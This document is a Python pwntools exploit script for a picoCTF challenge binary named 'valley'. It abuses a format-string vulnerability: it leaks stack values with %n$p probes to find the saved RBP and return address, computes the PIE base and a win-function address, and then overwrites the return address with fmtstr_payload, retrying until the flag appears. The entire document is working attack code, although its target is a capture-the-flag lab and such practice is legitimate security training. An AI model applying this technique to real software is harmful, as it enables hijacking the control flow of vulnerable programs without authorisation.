from pwn import *

elf = ELF('./valley')
context.binary = elf  

offset = 0x1413
win_offset = 0x1269

def attempt():
    p = process("./valley")
    # p = remote('shape-facility.picoctf.net', 62573)
    
    p.recvuntil(b"Welcome to the Echo Valley, Try Shouting: \n")

    leak = None
    ret = None

    for n in range(6, 22):
        payload = "%" + str(n) + "$p"
        p.sendline(payload.encode())
        p.recvuntil(b"You heard in the distance: ")
        response = p.recvline().decode().strip()
        if n == 20:
            print(f"saved RBP : {response}")
            ret = int(response, 16) + 8
            print(f"RET address : {hex(ret)}")
        if n == 21:
            print(f"saved RIP : {response}")
            leak = response

    if not leak or not ret:
        p.close()
        return False

    base   = int(leak, 16) - offset
    target = base + win_offset
    print(f"base   : {hex(base)}")
    print(f"target : {hex(target)}")

    payload = fmtstr_payload(6, {ret: target})
    p.sendline(payload)
    p.recvuntil(b"You heard in the distance: ")
    
    p.sendline(b"exit")
    result = p.recvall(timeout=3).decode(errors='ignore')
    print(result)
    
    p.close()
    
    if "The Valley Disappears\n" in result:
        print("[+] FLAG FOUND!")
        return True
    
    return False

attempt_num = 1
while True:
    print(f"\n[*] Attempt #{attempt_num}")
    try:
        if attempt():
            break
    except Exception as e:
        print(f"[-] Failed: {e}")
    attempt_num += 1
